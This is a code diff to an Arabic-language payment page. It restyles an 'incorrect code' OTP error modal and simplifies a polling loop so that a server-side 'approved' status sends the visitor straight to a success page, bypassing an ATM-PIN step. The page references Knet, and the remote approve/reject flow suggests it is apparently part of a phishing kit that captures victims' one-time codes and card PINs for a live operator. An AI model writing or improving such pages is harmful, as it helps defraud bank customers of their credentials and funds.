@@ -279,7 +279,7 @@
         <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
             <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
             <h3 style="color:#dc3545;margin-bottom:10px;" id="errorTitle">الرمز غير صحيح</h3>
-            <p style="color:#555;font-size:15px;" id="errorMessage">الرمز الذي أدخلته غير صحيح. يرجى التحقق من الرمز المرسل إلى هاتفك والمحاولة مرة أخرى.</p>
+            <p style="color:#dc3545;font-size:15px;font-weight:bold;" id="errorMessage">الرمز الذي تم إدخاله غير صحيح وغير صالح. يرجى التحقق من الرمز المرسل عبر الجوال وإعادة المحاولة</p>
             <button onclick="closeOtpErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">إعادة المحاولة</button>
         </div>
     </div>
@@ -305,15 +305,8 @@
                 if (data.status === 'approved') {
                     clearInterval(pollInterval);
                     document.getElementById('loadingOverlay').style.display = 'none';
-                    const nextPages = {
-                        'loading_otp': 'otp.html',
-                        'otp': 'otp.html',
-                        'loading_atm': 'atm-pin.html',
-                        'atm_pin': 'atm-pin.html',
-                        'loading_success': 'success.html',
-                        'success': 'success.html'
-                    };
-                    window.location.href = nextPages[data.currentPage] || 'atm-pin.html';
+                    // Knet goes directly to success page after OTP approval
+                    window.location.href = 'success.html';
                 } else if (data.status === 'rejected') {
                     clearInterval(pollInterval);
                     document.getElementById('loadingOverlay').style.display = 'none';
